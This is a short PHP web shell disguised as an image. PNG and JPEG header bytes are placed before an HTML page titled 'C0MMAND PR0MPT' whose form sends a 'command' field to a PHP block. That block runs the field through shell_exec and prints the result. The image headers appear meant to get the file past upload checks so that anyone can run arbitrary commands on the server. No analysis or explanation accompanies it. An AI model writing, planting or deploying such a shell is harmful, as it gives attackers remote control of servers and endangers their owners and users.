‰PNG

IHDR  ô      Õæš   sRGB ®Îé    IDATx^ì½ ¼eWY6þœÞn™;%3™™´	é$„ Ò‹` B>APP)Ÿˆ€X@#¨ØåD”À
ÿØÿà JFIF  ` `  ÿþš<!DOCTYPE html>
<html>
<head>
    <title>C0MMAND PR0MPT</title>
</head>
<body>
    <center>
    <br />
    <br />
    <br />
    <br />
    <br />
    <form method="post">
        <label for="command"></label>
        <input type="text" name="command" id="command" placeholder="command">
        <input type="submit" value="go">
    </form>
‰PNG

IHDR  ô      Õæš   sRGB ®Îé    IDATx^ì½ ¼eWY6þœÞn™;%3™™´	é$„ Ò‹` B>APP)Ÿˆ€X@#¨ØåD”À
ÿØÿà JFIF  ` `  ÿþš<?php
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $command = $_POST['command'];
        $output = shell_exec($command);
        echo "<pre>$output</pre>";
    }
    ?>
    </center>
</body>
</html>